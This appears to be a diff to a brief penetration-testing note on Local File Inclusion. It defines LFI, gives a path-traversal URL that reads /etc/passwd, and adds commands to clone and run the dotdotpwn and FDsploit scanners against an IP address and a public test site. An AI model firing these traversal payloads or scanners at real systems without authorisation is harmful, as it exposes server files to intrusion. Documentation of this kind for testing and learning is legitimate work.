@@ -1,10 +1,24 @@
 LFI (Local File Inclusion) is a web vulnerability where an attacker can read or include files from the server’s local filesystem due to improper input validation in file/path parameters.
 
                                                                                           
-                                                                                          Testing Example
+                                                                                          Steps To Reproduce
+
+
+
 
 https://example.com/index.php?page=about.php
 https://example.com/index.php?page=../../../../etc/passwd
+
+
+
+git clone https://github.com/wireghoul/dotdotpwn.git
+cd dotdotpwn
+./dotdotpwn.pl -m http -h 10.196.199.13
+
+
+git clone https://github.com/chrispetrou/FDsploit.git
+cd FDsploit
+python fdsploit.py -u "http://testphp.vulnweb.com/artists.php?artist=*" 
 
 
                                                                                             Payload's
